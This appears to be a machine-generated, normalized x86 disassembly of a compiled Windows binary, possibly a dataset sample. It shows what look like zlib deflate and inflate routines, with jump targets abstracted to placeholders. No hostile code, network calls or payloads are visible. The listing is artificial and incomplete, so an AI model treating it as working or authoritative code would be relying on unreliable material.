mov [ eax + edx * 2 ] di
mov ecx [ esi + 0x40 ]
mov edx [ esi + 0x3c ]
mov ax [ esi + 0x64 ]
mov [ edx + ecx * 2 ] ax
mov eax [ esi + 0x58 ]
dec eax
mov [ esi + 0x58 ] eax
jne r-xdata
jmp r-xdata
inc [ esi + 0x64 ]
sub_406990
sub esp 0x14
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x28 ]
mov esi [ edi + 0x24 ]
mov eax [ edi + 0x74 ]
mov edx [ edi + 0x64 ]
mov ecx [ edi + 0x30 ]
mov ebp [ edi + 0x70 ]
mov [ esp + 0x14 ] eax
mov eax [ edi + 0x88 ]
lea ebx [ esi - 0x106 ]
add ecx edx
cmp edx ebx
mov [ esp + 0x18 ] eax
jbe r-xdata
mov [ esp + 0x1c ] 0x0
sub edx esi
add edx 0x106
mov [ esp + 0x1c ] edx
jmp r-xdata
mov edx [ edi + 0x6c ]
cmp eax edx
mov [ esp + 0x20 ] edx
jbe r-xdata
shr [ esp + 0x14 ] 0x2
mov dl [ ecx + ebp - 0x1 ]
lea ebx [ ecx + 0x102 ]
mov [ esp + 0x28 ] dl
mov dl [ ecx + ebp ]
mov [ esp + 0x13 ] dl
mov edx [ edi + 0x84 ]
cmp ebp edx
jb r-xdata
mov esi [ esp + 0x2c ]
mov [ esp + 0x18 ] edx
mov edx [ edi + 0x2c ]
mov eax [ edi + 0x38 ]
and edx esi
xor esi esi
mov si [ eax + edx * 2 ]
mov eax [ esp + 0x1c ]
cmp esi eax
jbe r-xdata
mov al [ esp + 0x28 ]
cmp [ edx + ebp - 0x1 ] al
jne r-xdata
mov eax [ esp + 0x20 ]
cmp ebp eax
ja r-xdata
mov eax [ esp + 0x14 ]
dec eax
mov [ esp + 0x14 ] eax
jne r-xdata
mov al [ edx ]
cmp al [ ecx ]
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov eax ebp
mov edx [ edi + 0x30 ]
mov al [ esp + 0x13 ]
add edx esi
cmp [ edx + ebp ] al
jne r-xdata
mov al [ edx + 0x1 ]
inc edx
cmp al [ ecx + 0x1 ]
jne r-xdata
add ecx 0x2
inc edx
mov edx ecx
lea ecx [ ebx - 0x102 ]
sub edx ebx
add edx 0x102
cmp edx ebp
jle r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
mov eax [ esp + 0x18 ]
mov [ edi + 0x68 ] esi
cmp edx eax
mov ebp edx
jge r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
mov al [ edx + ecx - 0x1 ]
mov dl [ edx + ecx ]
mov [ esp + 0x28 ] al
mov [ esp + 0x13 ] dl
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
cmp ecx ebx
jb r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
sub_406b00
push ecx
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
xor edi edi
mov ebp 0x2
cmp eax 0x3
jb r-xdata
push esi
call sub_4064b0
mov eax [ esi + 0x6c ]
mov ebx [ esp + 0x20 ]
add esp 0x4
cmp eax 0x106
jae r-xdata
mov edx [ esi + 0x58 ]
mov eax [ esi + 0x68 ]
test edi edi
mov [ esi + 0x70 ] edx
mov [ esi + 0x5c ] eax
mov [ esi + 0x58 ] ebp
je r-xdata
mov eax [ esi + 0x40 ]
mov ecx [ esi + 0x50 ]
mov edx [ esi + 0x64 ]
mov edi [ esi + 0x4c ]
shl eax cl
mov ecx [ esi + 0x30 ]
xor ebx ebx
mov bl [ ecx + edx + 0x2 ]
mov ecx [ esi + 0x3c ]
xor eax ebx
and eax edi
xor edi edi
mov [ esi + 0x40 ] eax
mov di [ ecx + eax * 2 ]
mov eax [ esi + 0x2c ]
mov ecx [ esi + 0x38 ]
and eax edx
mov [ ecx + eax * 2 ] di
mov edx [ esi + 0x40 ]
mov eax [ esi + 0x3c ]
mov cx [ esi + 0x64 ]
mov [ eax + edx * 2 ] cx
test eax eax
je r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x70 ]
cmp eax 0x3
jb r-xdata
mov eax [ esi + 0x78 ]
mov ecx edx
cmp ecx eax
jae r-xdata
mov eax [ esi + 0x60 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov eax [ esi + 0x60 ]
test eax eax
je r-xdata
cmp [ esi + 0x58 ] eax
ja r-xdata
mov edx [ esi + 0x64 ]
mov eax [ esi + 0x24 ]
sub edx edi
sub eax 0x106
cmp edx eax
ja r-xdata
mov ecx [ esi + 0x54 ]
test ecx ecx
jl r-xdata
mov eax [ esi + 0x64 ]
mov ecx [ esi + 0x30 ]
mov edx [ esi + 0x1698 ]
mov al [ eax + ecx - 0x1 ]
mov ecx [ esi + 0x169c ]
mov [ esp + 0x1c ] al
mov [ ecx + edx * 2 ] 0x0
mov edx [ esi + 0x1690 ]
mov ecx [ esi + 0x1698 ]
mov [ edx + ecx ] al
mov eax [ esi + 0x1698 ]
mov edx [ esp + 0x1c ]
inc eax
and edx 0xff
mov [ esi + 0x1698 ] eax
inc [ esi + edx * 4 + 0x8c ]
mov [ esi + 0x60 ] 0x0
lea eax [ esi + edx * 4 + 0x8c ]
mov ecx [ esi + 0x64 ]
mov eax [ esi + 0x6c ]
inc ecx
dec eax
mov [ esi + 0x60 ] 0x1
mov [ esi + 0x64 ] ecx
mov [ esi + 0x6c ] eax
jmp r-xdata
mov edx [ esi + 0x64 ]
mov eax [ esi + 0x30 ]
mov ecx [ esi + 0x1698 ]
mov al [ edx + eax - 0x1 ]
mov edx [ esi + 0x169c ]
mov [ esp + 0x10 ] al
mov [ edx + ecx * 2 ] 0x0
mov ecx [ esi + 0x1690 ]
mov edx [ esi + 0x1698 ]
mov [ ecx + edx ] al
mov eax [ esp + 0x10 ]
mov edx [ esi + 0x1698 ]
and eax 0xff
inc edx
lea eax [ esi + eax * 4 + 0x8c ]
mov [ esi + 0x1698 ] edx
inc [ eax ]
mov ecx [ esi + 0x1694 ]
mov eax [ esi + 0x1698 ]
dec ecx
cmp eax ecx
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ esi + 0x6c ]
mov cl [ esi + 0x70 ]
mov ebx [ esi + 0x169c ]
lea ebp [ edx + eax - 0x3 ]
mov ax dx
sub ax [ esi + 0x5c ]
mov edx [ esi + 0x1698 ]
sub cl 0x3
dec eax
mov [ esp + 0x18 ] cl
mov [ ebx + edx * 2 ] ax
mov edx [ esi + 0x1690 ]
mov ebx [ esi + 0x1698 ]
add eax 0xffff
mov [ edx + ebx ] cl
mov edx [ esi + 0x1698 ]
mov ecx [ esp + 0x18 ]
inc edx
mov [ esi + 0x1698 ] edx
and ecx 0xff
xor edx edx
mov dl [ ecx + r--data ]
inc [ esi + edx * 4 + 0x490 ]
cmp ax 0x100
lea ecx [ esi + edx * 4 + 0x490 ]
jae r-xdata
cmp [ esi + 0x80 ] ebp
je r-xdata
xor eax eax
mov eax [ esi + 0x30 ]
add eax ecx
jmp r-xdata
mov eax [ esi + 0x6c ]
cmp eax 0x106
jae r-xdata
mov edx [ esi + 0x64 ]
mov ecx [ esi + 0x6c ]
inc edx
dec ecx
mov [ esi + 0x64 ] edx
mov edx [ esi ]
mov [ esi + 0x6c ] ecx
mov eax [ edx + 0x10 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x54 ]
test ecx ecx
jl r-xdata
and eax 0xffff
shr eax 0x7
xor edx edx
mov dl [ eax + r--data ]
mov eax edx
and eax 0xffff
xor ecx ecx
mov cl [ eax + r--data ]
mov eax ecx
jmp r-xdata
mov eax [ esi + 0x58 ]
cmp eax 0x5
ja r-xdata
push edi
push esi
call sub_406990
add esp 0x8
mov [ esi + 0x58 ] eax
mov eax ebx
pop edi
sub eax 0x4
pop esi
neg eax
sbb eax eax
pop ebp
and al 0xfe
pop ebx
add eax 0x3
pop ecx
retn
xor eax eax
cmp ebx 0x4
setne al
dec eax
pop edi
and eax ebp
pop esi
pop ebp
pop ebx
pop ecx
retn
xor edx edx
cmp ebx 0x4
sete dl
push edx
mov edx [ esi + 0x64 ]
sub edx ecx
push edx
push eax
push esi
call sub_408010
mov ecx [ esi ]
mov eax [ esi + 0x64 ]
push ecx
mov [ esi + 0x54 ] eax
call sub_4062d0
mov edx [ esi ]
add esp 0x14
mov eax [ edx + 0x10 ]
test eax eax
jne r-xdata
jmp r-xdata
xor eax eax
mov edx [ esi + 0x30 ]
mov eax ecx
add eax edx
jmp r-xdata
mov eax [ esi + 0x70 ]
dec eax
mov [ esi + 0x70 ] eax
jne r-xdata
mov eax [ esi + 0x40 ]
mov ecx [ esi + 0x50 ]
mov edi [ esi + 0x30 ]
shl eax cl
xor ecx ecx
mov cl [ edi + edx + 0x2 ]
mov edi [ esi + 0x4c ]
xor eax ecx
mov ecx [ esi + 0x3c ]
and eax edi
xor edi edi
mov [ esi + 0x40 ] eax
mov di [ ecx + eax * 2 ]
mov eax [ esi + 0x2c ]
mov ecx [ esi + 0x38 ]
and eax edx
mov [ ecx + eax * 2 ] di
mov edx [ esi + 0x40 ]
mov eax [ esi + 0x3c ]
mov cx [ esi + 0x64 ]
mov [ eax + edx * 2 ] cx
inc [ esi + eax * 4 + 0x980 ]
mov eax [ esi + 0x1694 ]
mov ecx [ esi + 0x1698 ]
mov edx [ esi + 0x6c ]
dec eax
xor ebx ebx
cmp ecx eax
mov eax [ esi + 0x70 ]
mov ecx 0x1
sete bl
sub ecx eax
add edx ecx
add eax 0xfffffffe
mov [ esi + 0x6c ] edx
mov [ esi + 0x70 ] eax
cmp [ esi + 0x80 ] 0x1
je r-xdata
mov edx [ esi + 0x64 ]
push 0x0
sub edx ecx
push edx
push eax
push esi
call sub_408010
mov ecx [ esi ]
mov eax [ esi + 0x64 ]
push ecx
mov [ esi + 0x54 ] eax
call sub_4062d0
add esp 0x14
mov ecx [ esi + 0x64 ]
inc ecx
mov edx ecx
mov [ esi + 0x64 ] ecx
cmp edx ebp
ja r-xdata
mov ecx [ esi + 0x64 ]
mov ebp 0x2
inc ecx
mov [ esi + 0x60 ] 0x0
test ebx ebx
mov [ esi + 0x58 ] ebp
mov [ esi + 0x64 ] ecx
je r-xdata
mov [ esi + 0x58 ] ebp
cmp eax 0x3
jne r-xdata
mov edx [ esi + 0x54 ]
test edx edx
jl r-xdata
mov ecx [ esi + 0x64 ]
mov edx [ esi + 0x68 ]
sub ecx edx
cmp ecx 0x1000
jbe r-xdata
xor eax eax
mov eax [ esi + 0x30 ]
add eax edx
jmp r-xdata
jmp r-xdata
sub ecx edx
push 0x0
push ecx
push eax
push esi
call sub_408010
mov eax [ esi ]
mov edx [ esi + 0x64 ]
push eax
mov [ esi + 0x54 ] edx
call sub_4062d0
mov ecx [ esi ]
add esp 0x14
mov eax [ ecx + 0x10 ]
test eax eax
je r-xdata
sub_406f30
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0x8 ]
push edi
test eax eax
je r-xdata
mov eax [ esi ]
mov edi [ esp + 0x10 ]
cmp eax 0x4
je r-xdata
mov ecx [ esi + 0x3c ]
mov [ eax ] ecx
mov edx [ esi + 0xc ]
mov eax [ edi + 0x28 ]
push edx
push eax
call [ edi + 0x24 ]
add esp 0x8
cmp eax 0x5
jne r-xdata
mov eax [ esi + 0x28 ]
mov [ esi ] 0x0
mov [ esi + 0x34 ] eax
mov [ esi + 0x30 ] eax
mov eax [ esi + 0x38 ]
mov [ esi + 0x1c ] 0x0
test eax eax
mov [ esi + 0x20 ] 0x0
je r-xdata
mov ecx [ esi + 0x4 ]
push edi
push ecx
call sub_409f10
add esp 0x8
cmp [ esi ] 0x6
jne r-xdata
pop edi
pop esi
retn
push 0x0
push 0x0
push 0x0
call eax
mov [ esi + 0x3c ] eax
add esp 0xc
mov [ edi + 0x30 ] eax
sub_406fb0
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
push 0x40
push 0x1
mov eax [ edi + 0x28 ]
push eax
call [ edi + 0x20 ]
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov ecx [ edi + 0x28 ]
push 0x5a0
push 0x8
push ecx
call [ edi + 0x20 ]
add esp 0xc
mov [ esi + 0x24 ] eax
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0x18 ]
mov eax [ edi + 0x28 ]
push ebx
push 0x1
push eax
call [ edi + 0x20 ]
add esp 0xc
mov [ esi + 0x28 ] eax
test eax eax
jne r-xdata
mov edx [ edi + 0x28 ]
push esi
push edx
call [ edi + 0x24 ]
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebx
retn
mov ecx [ esp + 0x14 ]
push 0x0
add eax ebx
push edi
push esi
mov [ esi + 0x2c ] eax
mov [ esi + 0x38 ] ecx
mov [ esi ] 0x0
call sub_406f30
add esp 0xc
mov eax esi
pop edi
pop esi
pop ebx
retn
mov ecx [ esi + 0x24 ]
mov edx [ edi + 0x28 ]
push ecx
push edx
call [ edi + 0x24 ]
mov eax [ edi + 0x28 ]
push esi
push eax
call [ edi + 0x24 ]
add esp 0x10
xor eax eax
pop edi
pop esi
pop ebx
retn
sub_407050
sub esp 0x30
mov eax [ esp + 0x38 ]
push ebx
mov ebx [ esp + 0x38 ]
push ebp
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0x20 ]
mov ebp [ ebx + 0x1c ]
mov [ esp + 0x8 ] ecx
mov ecx [ ebx + 0x34 ]
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x30 ]
push esi
cmp ecx eax
push edi
mov [ esp + 0x14 ] edx
mov [ esp + 0x44 ] ecx
jae r-xdata
mov eax [ ebx + 0x2c ]
sub eax ecx
sub eax ecx
dec eax
jmp r-xdata
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x48 ]
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x1c ] ebp
mov esi [ eax ]
mov ebp [ eax + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0x10 ]
push 0xfffffffe
mov edx ecx
mov [ eax ] ecx
mov ecx [ esp + 0x48 ]
sub edx esi
add ebp edx
push eax
mov [ eax + 0x8 ] ebp
push ebx
mov [ ebx + 0x34 ] ecx
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
jmp [ eax * 4 + jump_table_407d20 ]
mov [ esp + 0x1c ] eax
mov esi [ esp + 0x18 ]
cmp ebp 0x3
jae r-xdata
mov esi [ esp + 0x18 ]
mov edi [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
cmp ebp 0x20
jae r-xdata
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
mov edi [ esp + 0x18 ]
cmp ebp 0xe
jae r-xdata
mov edi [ esp + 0x18 ]
mov esi [ esp + 0x48 ]
mov edi [ esp + 0x18 ]
mov esi [ esp + 0x48 ]
mov edi [ esp + 0x18 ]
mov esi [ esp + 0x48 ]
mov ecx [ esp + 0x44 ]
mov esi [ esp + 0x48 ]
mov edi [ esp + 0x10 ]
mov ecx [ esp + 0x44 ]
mov esi [ esp + 0x48 ]
mov edi [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x48 ]
mov edx [ esp + 0x14 ]
mov [ ebx + 0x20 ] ecx
mov ecx [ esp + 0x10 ]
mov [ ebx + 0x1c ] ebp
mov esi [ eax ]
mov ebp [ eax + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx ecx
sub edx esi
mov [ eax ] ecx
mov ecx [ esp + 0x44 ]
add ebp edx
push 0xfffffffd
push eax
mov [ eax + 0x8 ] ebp
push ebx
mov [ ebx + 0x34 ] ecx
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov edi [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov edi [ esp + 0x10 ]
mov edx esi
mov ecx esi
not edx
and ecx 0xffff
shr edx 0x10
xor edx ecx
jne r-xdata
xor edx edx
cmp edi edx
je r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x48 ]
mov [ ebx + 0x20 ] ecx
mov ecx [ esp + 0x10 ]
mov [ ebx + 0x1c ] ebp
mov esi [ eax ]
mov ebp [ eax + 0x8 ]
mov edx ecx
sub edx esi
mov [ eax ] ecx
mov ecx [ esp + 0x44 ]
add ebp edx
mov edx [ esp + 0x4c ]
mov [ eax + 0x4 ] 0x0
push edx
push eax
mov [ eax + 0x8 ] ebp
push ebx
mov [ ebx + 0x34 ] ecx
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov ecx [ esp + 0x1c ]
test ecx ecx
jne r-xdata
mov eax edi
and eax 0x3fff
mov ecx eax
mov [ ebx + 0x4 ] eax
and ecx 0x1f
cmp ecx 0x1d
ja r-xdata
mov esi [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ ebx + 0x8 ]
mov eax 0x13
cmp ecx eax
jae r-xdata
cmp ebp 0x3
jae r-xdata
mov ecx [ ebx + 0x24 ]
mov eax [ ebx + 0x4 ]
push esi
push ecx
lea edx [ esp + 0x40 ]
lea ecx [ esp + 0x44 ]
push edx
push ecx
lea edx [ esp + 0x2c ]
lea ecx [ esp + 0x30 ]
push edx
mov edx [ ebx + 0xc ]
push ecx
mov ecx eax
shr ecx 0x5
and ecx 0x1f
and eax 0x1f
inc ecx
push edx
add eax 0x101
push ecx
push eax
mov [ ebx + 0x14 ] 0x0
mov [ esp + 0x44 ] 0x9
mov [ esp + 0x40 ] 0x6
call sub_40a4a0
add esp 0x24
mov [ esp + 0x18 ] eax
test eax eax
jne r-xdata
mov eax [ ebx + 0x10 ]
cmp ebp eax
jae r-xdata
push eax
push esi
push ebx
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov ecx [ ebx + 0x4 ]
push esi
push ecx
mov [ esp + 0x54 ] 0x0
call sub_409f10
mov eax [ ebx + 0x20 ]
mov ecx [ ebx + 0x34 ]
mov edi [ esi ]
mov edx [ esi + 0x4 ]
mov ebp [ ebx + 0x1c ]
mov [ esp + 0x20 ] eax
mov eax [ ebx + 0x30 ]
add esp 0x8
cmp ecx eax
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] edx
mov [ esp + 0x44 ] ecx
jae r-xdata
mov [ ebx ] 0x8
jmp r-xdata
mov edx [ esp + 0x18 ]
mov [ ebx + 0x1c ] ebp
mov [ ebx + 0x20 ] edx
mov edx [ esp + 0x14 ]
mov ebp [ esi ]
mov [ esi + 0x4 ] edx
mov edx edi
mov [ esi ] edi
sub edx ebp
mov ebp [ esi + 0x8 ]
add ebp edx
mov [ esi + 0x8 ] ebp
mov [ ebx + 0x34 ] ecx
mov eax [ ebx ]
cmp eax 0x9
ja r-xdata
jmp [ eax * 4 + jump_table_407d48 ]
mov eax [ esp + 0x48 ]
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x1c ] ebp
mov ecx edi
mov edx [ eax ]
mov ebp [ eax + 0x8 ]
sub ecx edx
mov edx [ esp + 0x44 ]
add ebp ecx
mov ecx [ esp + 0x4c ]
push ecx
push eax
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] ebp
mov [ eax ] edi
push ebx
mov [ ebx + 0x34 ] edx
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
xor ecx ecx
dec eax
mov cl [ edi ]
mov [ esp + 0x4c ] 0x0
mov edx ecx
mov ecx ebp
shl edx cl
add ebp 0x8
mov [ esp + 0x14 ] eax
or esi edx
inc edi
cmp ebp 0x3
mov [ esp + 0x18 ] esi
mov [ esp + 0x10 ] edi
jb r-xdata
mov ecx [ esp + 0x48 ]
mov [ ebx ] 0x9
mov edx eax
push 0xfffffffd
mov [ ecx + 0x18 ] rw-data
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x1c ] ebp
mov esi [ ecx ]
mov ebp [ ecx + 0x8 ]
sub edx esi
add ebp edx
mov [ ecx ] eax
mov eax [ esp + 0x48 ]
push ecx
mov [ ecx + 0x4 ] edi
mov [ ecx + 0x8 ] ebp
push ebx
mov [ ebx + 0x34 ] eax
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
xor ebp ebp
mov eax ecx
cmp eax ebp
mov [ ebx + 0x4 ] ecx
mov [ esp + 0x18 ] ebp
je r-xdata
mov ecx [ esp + 0x48 ]
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x1c ] ebp
mov esi [ ecx ]
mov ebp [ ecx + 0x8 ]
mov [ ecx + 0x4 ] edx
mov edx eax
sub edx esi
mov [ ecx ] eax
mov eax [ esp + 0x44 ]
add ebp edx
mov edx [ esp + 0x4c ]
mov [ ecx + 0x8 ] ebp
push edx
push ecx
push ebx
mov [ ebx + 0x34 ] eax
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
xor ecx ecx
mov [ esp + 0x4c ] edx
mov cl [ eax ]
dec edi
mov edx ecx
mov ecx ebp
shl edx cl
add ebp 0x8
mov [ esp + 0x14 ] edi
or esi edx
inc eax
cmp ebp 0x20
mov [ esp + 0x10 ] eax
jb r-xdata
mov eax [ ebx + 0x4 ]
mov [ esp + 0x4c ] 0x0
cmp eax edi
jbe r-xdata
mov ecx [ ebx + 0x2c ]
mov edx [ esp + 0x44 ]
cmp edx ecx
jne r-xdata
mov eax [ esp + 0x48 ]
mov ecx [ esp + 0x14 ]
mov [ ebx ] 0x9
push 0xfffffffd
mov [ eax + 0x18 ] rw-data
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov esi [ eax ]
mov ebp [ eax + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0x14 ]
push eax
mov edx ecx
mov [ eax ] ecx
mov ecx [ esp + 0x4c ]
sub edx esi
add ebp edx
push ebx
mov [ eax + 0x8 ] ebp
mov [ ebx + 0x34 ] ecx
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov edx eax
and edx 0x3e0
cmp edx 0x3a0
ja r-xdata
mov eax [ esp + 0x48 ]
mov ecx [ esp + 0x10 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov esi [ eax ]
mov ebp [ eax + 0x8 ]
mov edx ecx
mov [ eax ] ecx
mov ecx [ esp + 0x44 ]
sub edx esi
add ebp edx
mov edx [ esp + 0x4c ]
push edx
push eax
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] ebp
push ebx
mov [ ebx + 0x34 ] ecx
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
xor ecx ecx
dec esi
mov cl [ eax ]
mov [ esp + 0x4c ] 0x0
mov edx ecx
mov ecx ebp
shl edx cl
add ebp 0x8
mov [ esp + 0x14 ] esi
or edi edx
inc eax
cmp ebp 0xe
mov [ esp + 0x10 ] eax
jb r-xdata
mov edx [ ebx + 0x24 ]
push esi
lea ecx [ ebx + 0x14 ]
lea eax [ ebx + 0x10 ]
push edx
mov edx [ ebx + 0xc ]
push ecx
push eax
push edx
mov [ eax ] 0x7
call sub_409f30
add esp 0x14
mov [ esp + 0x18 ] eax
test eax eax
jne r-xdata
mov ecx [ ebx + 0x8 ]
mov edx [ ecx * 4 + r--data ]
mov ecx [ ebx + 0xc ]
mov [ ecx + edx * 4 ] 0x0
mov edx [ ebx + 0x8 ]
inc edx
mov ecx edx
mov [ ebx + 0x8 ] edx
cmp ecx eax
jb r-xdata
mov ecx [ ebx + 0x8 ]
mov eax edi
and eax 0x7
sub ebp 0x3
mov edx [ ecx * 4 + r--data ]
mov ecx [ ebx + 0xc ]
shr edi 0x3
mov [ ecx + edx * 4 ] eax
mov edx [ ebx + 0x8 ]
inc edx
mov [ ebx + 0x8 ] edx
mov eax edx
mov edx [ ebx + 0x4 ]
shr edx 0xa
add edx 0x4
cmp eax edx
jb r-xdata
mov eax [ esp + 0x10 ]
cmp [ esp + 0x18 ] 0xfffffffd
jne r-xdata
mov edx [ esp + 0x38 ]
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x1c ]
push esi
push edx
mov edx [ esp + 0x28 ]
push eax
push ecx
push edx
call sub_409720
add esp 0x14
test eax eax
je r-xdata
mov eax [ eax * 4 + rw-data ]
mov ecx [ ebx + 0x14 ]
and eax edi
xor edx edx
mov dl [ ecx + eax * 8 + 0x1 ]
lea eax [ ecx + eax * 8 ]
mov [ esp + 0x18 ] edx
mov eax [ eax + 0x4 ]
cmp eax 0x10
mov [ esp + 0x34 ] eax
jae r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
mov eax [ ebx + 0x2c ]
sub eax ecx
sub eax ecx
dec eax
jmp r-xdata
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x1c ] ebp
mov ebp [ esi ]
mov eax edi
mov [ esi + 0x4 ] edx
mov edx [ esi + 0x8 ]
sub eax ebp
push 0x1
add edx eax
push esi
mov [ esi + 0x8 ] edx
mov [ esi ] edi
push ebx
mov [ ebx + 0x34 ] ecx
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
sub ebp 0x3
mov [ ebx ] 0x1
mov ecx ebp
and ecx 0x7
shr esi 0x3
shr esi cl
sub ebp ecx
mov [ esp + 0x18 ] esi
jmp r-xdata
mov edx [ esp + 0x48 ]
lea eax [ esp + 0x24 ]
push edx
lea ecx [ esp + 0x2c ]
push eax
lea edx [ esp + 0x34 ]
push ecx
lea eax [ esp + 0x3c ]
push edx
push eax
call sub_40a630
mov ecx [ esp + 0x5c ]
mov edx [ esp + 0x38 ]
mov eax [ esp + 0x3c ]
push ecx
mov ecx [ esp + 0x44 ]
push edx
mov edx [ esp + 0x4c ]
push eax
push ecx
push edx
call sub_409720
add esp 0x28
mov [ ebx + 0x4 ] eax
test eax eax
je r-xdata
shr esi 0x3
mov [ esp + 0x18 ] esi
sub ebp 0x3
mov [ ebx ] 0x3
jmp r-xdata
mov eax [ esp + 0x48 ]
mov ecx [ esp + 0x14 ]
mov [ ebx ] 0x9
add ebp 0xfffffffd
shr esi 0x3
mov [ eax + 0x18 ] rw-data
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x1c ] ebp
mov ebp [ eax + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ eax ]
mov edx edi
push 0xfffffffd
sub edx ecx
mov ecx [ esp + 0x48 ]
add ebp edx
push eax
mov [ eax + 0x8 ] ebp
mov [ eax ] edi
push ebx
mov [ ebx + 0x34 ] ecx
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
test eax eax
je r-xdata
jmp r-xdata
mov eax [ ebx + 0x18 ]
neg eax
sbb eax eax
and eax 0x7
mov [ ebx ] eax
jmp r-xdata
mov eax 0x2
mov [ ebx ] eax
jmp r-xdata
cmp eax ecx
jbe r-xdata
mov eax edi
mov eax [ esp + 0x4c ]
mov edi [ esp + 0x48 ]
push eax
push edi
push ebx
mov [ ebx + 0x34 ] edx
call sub_40a660
mov edx [ ebx + 0x34 ]
mov esi [ ebx + 0x30 ]
add esp 0xc
cmp edx esi
mov [ esp + 0x4c ] eax
mov [ esp + 0x44 ] edx
jae r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ ebx + 0x28 ]
cmp eax esi
je r-xdata
mov esi [ esp + 0x48 ]
push 0x4
shr eax 0x5
and eax 0x1f
lea eax [ eax + ecx + 0x102 ]
mov ecx [ esi + 0x28 ]
push eax
push ecx
call [ esi + 0x20 ]
add esp 0xc
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
cmp [ esp + 0x18 ] 0xfffffffd
jne r-xdata
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x5
jmp r-xdata
mov eax [ esp + 0x10 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov ecx [ esi + 0x8 ]
mov edx eax
sub edx edi
mov [ esi ] eax
mov eax [ esp + 0x44 ]
add ecx edx
mov [ esi + 0x8 ] ecx
mov ecx [ esp + 0x4c ]
push ecx
push esi
mov [ esi + 0x4 ] 0x0
push ebx
mov [ ebx + 0x34 ] eax
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov edx ecx
xor ecx ecx
mov cl [ eax ]
dec edx
mov [ esp + 0x14 ] edx
mov edx ecx
mov ecx ebp
add ebp 0x8
shl edx cl
mov [ esp + 0x4c ] 0x0
or edi edx
inc eax
cmp ebp 0x3
mov [ esp + 0x10 ] eax
jb r-xdata
mov eax [ esp + 0x14 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov edx [ esi + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov ecx eax
mov [ esi ] eax
mov eax [ esp + 0x18 ]
sub ecx edi
add edx ecx
push eax
